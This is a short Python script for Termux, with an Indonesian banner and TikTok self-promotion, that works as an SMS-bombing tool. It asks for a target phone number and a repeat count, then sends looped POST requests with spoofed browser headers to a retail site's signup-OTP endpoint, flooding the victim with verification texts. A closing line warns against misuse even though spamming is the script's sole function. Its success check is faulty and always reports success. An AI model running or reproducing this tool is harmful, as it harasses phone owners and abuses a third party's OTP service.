import json
import requests
import sys
import os




def main():
	os.system('clear')
	os.system('figlet cemonk01   x Tiktod')
	os.system("termux-open-url https://vt.tiktok.com/ZGJAfDGea/")
	banner = '''
\033[1;32m
𝙂𝘼 𝙎𝙐𝘽𝙍𝙀𝙆 𝙎𝘾𝙄𝙋𝙍𝙏 𝙀𝙍𝙊𝙍𝙍××××× 𝘼𝙊𝙒𝙆𝙒𝙊𝙒
𝘾𝘼𝙉𝘿𝘼 𝙉𝙂𝘽 �


[+]Made by :\033[1;35mC͙E͙M͙O͙N͙K͙01
\033[1;32m
[+]Tiktod :\033[1;35mjigongbapakau_
\033[1;32m

≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈»

 𝘾𝘼𝙇𝙇 𝙎𝙏𝘼𝙍𝙏 𝘿𝘼𝙍𝙄 𝘼𝙉𝙂𝙆𝘼 0 𝙔𝘼 𝘽𝙍𝙊!
  =\033[1;35m 08************
\033[1;32m
≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈

#catatan\033[1;32m =\033[1;35m jika kau pikir kepergian mu membuat ku lebih baik. Engkau sangat salah,karena aku hanya bersembunyi di balik kata bijak agar kau percaya aku terlihat tegar!!!
\033[1;32m#Lord-sesath
\033[1;32m

<><><><><><><><><><><><><><><><><><><><><><>¿!'''




	print(banner)

	print('\033[1;32mlangsung gas aja kawand jangan banyak kecod ')


	no = input('\033[1;32mmasukin no targetnya cok :\033[1;35m ')

	jum = input('\033[1;32mini jumlah spam nya tod : \033[1;35m')





	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}



	dat = {
	'phone' : no
	}


	for x in range(int(jum)) :
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)




	if 'eror' in leosureo:

		print('gagal mengirim cok' + no)

	else:
		print('\033[1;32msuccses mengirim tod ke :' +'\033[1;35m', no), 



		print('\033[1;32mJANGAN DI SALAH GUNAKAN TOD APALAGI BUAT SPAM MAK LU NANTI DI KICK DARI KK!!!!'
	)




main()
